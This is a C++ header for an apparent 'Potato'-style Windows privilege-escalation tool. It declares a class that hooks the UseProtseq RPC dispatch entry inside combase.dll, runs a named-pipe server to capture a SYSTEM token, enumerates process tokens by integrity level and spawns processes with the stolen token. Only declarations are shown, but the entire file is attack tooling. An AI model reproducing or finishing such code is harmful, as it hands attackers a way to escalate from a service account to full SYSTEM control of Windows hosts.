#pragma once

#ifndef IMPERSONATEPPPOTATOCONTEXT_H
#define IMPERSONATEPPPOTATOCONTEXT_H

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <rpc.h>
#include <rpcndr.h>
#include <objbase.h>
#include <combaseapi.h>
#include <psapi.h>
#include <sddl.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <stdexcept>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "psapi.lib")


namespace ImpersonatePPPotato {

class ImpersonatePPPotatoContext {
public:

    ImpersonatePPPotatoContext(std::wostream& consoleWriter, const std::wstring& pipeName);
    ~ImpersonatePPPotatoContext();

    void* GetCombaseModule() const { return m_CombaseModule; }
    void* GetDispatchTablePtr() const { return m_DispatchTablePtr; }
    void* GetUseProtseqFunctionPtr() const { return m_UseProtseqFunctionPtr; }
    DWORD GetUseProtseqFunctionParamCount() const { return m_ucParamCount; }
    bool IsStarted() const { return m_bStarted; }
    void InitContext();
    void HookRPC();
    void Restore();
    void Start();
    void Stop();

    HANDLE GetToken() const { return m_hSystemToken; }

private:

    void PipeServerThread();
    void* GetHookFunction(BYTE ucParamCount);

    DWORD HookProc(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12, void* p13);

    template<int N>
    static DWORD __stdcall HookDelegate(void* p0, void* p1, void* p2, void* p3, void* p4, void* p5, void* p6, void* p7, void* p8, void* p9, void* p10, void* p11, void* p12, void* p13) {
        (void)p0; (void)p1; (void)p2; (void)p3; (void)p4; (void)p5; (void)p6; (void)p7; (void)p8; (void)p9; (void)p10; (void)p11; (void)p12; (void)p13;
        ImpersonatePPPotatoContext* ctx = GetCurrentContext();
        if (ctx) {
            return ctx->HookProc(p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13);
        }
        return 0;
    }

    static ImpersonatePPPotatoContext* GetCurrentContext() { return s_pCurrentContext; }
    static void SetCurrentContext(ImpersonatePPPotatoContext* ctx) { s_pCurrentContext = ctx; }

    BOOL CreatePipeSecurity(PSECURITY_DESCRIPTOR* ppSecurityDescriptor, PULONG pSecurityDescriptorSize);
    static BOOL EnablePrivilege(LPCWSTR PrivilegeName);
    static void* ReadPtr(void* ptr, SIZE_T offset);
    static SHORT ReadInt16(void* ptr, SIZE_T offset);
    static BYTE ReadByte(void* ptr, SIZE_T offset);
    static int SundaySearch(const BYTE* text, int textLen, const BYTE* pattern, int patternLen);

    void* FindRpcInterface(void* combaseBase, SIZE_T combaseSize, const GUID* pGuid);

    static void* GetCombaseBase();
    static BOOL GetModuleInfo(HMODULE hModule, MODULEINFO* pModuleInfo);
    static BOOL IsSystemToken(HANDLE TokenHandle);
    static DWORD GetTokenIntegrityLevel(HANDLE hToken);
    static DWORD GetTokenImpersonationLevel(HANDLE hToken);
    static std::wstring GetTokenUserName(HANDLE hToken);

    struct ProcessTokenInfo {
        HANDLE TokenHandle;
        DWORD TargetProcessId;
        DWORD TargetProcessToken;
        DWORD IntegrityLevel;
        DWORD ImpersonationLevel;
        std::wstring UserName;
    };

    static BOOL GetProcessTokensWithIntegrity(std::vector<ProcessTokenInfo>& tokens, DWORD targetPid = -1);

    static BOOL CloseProcessTokenInfo(ProcessTokenInfo& tokenInfo);

public:
    BOOL CreateProcessWithToken(HANDLE hToken, LPCWSTR lpCommandLine, std::wstring* pOutput);

private:
    std::wostream& m_ConsoleWriter;
    std::wstring m_PipeName;

    void* m_CombaseModule;
    SIZE_T m_CombaseSize;

    void* m_DispatchTablePtr;
    void* m_UseProtseqFunctionPtr;
    void* m_ProcString;
    std::vector<void*> m_DispatchTable;
    std::vector<SHORT> m_FmtStringOffsetTable;

    void* m_OriginalDispatchFn;

    std::atomic<BOOL> m_bHooked;
    std::atomic<BOOL> m_bStarted;

    HANDLE m_hPipe;
    std::thread* m_pPipeThread;
    HANDLE m_hSystemToken;
    BYTE m_ucParamCount;

    static ImpersonatePPPotatoContext* s_pCurrentContext;
};

}

#endif
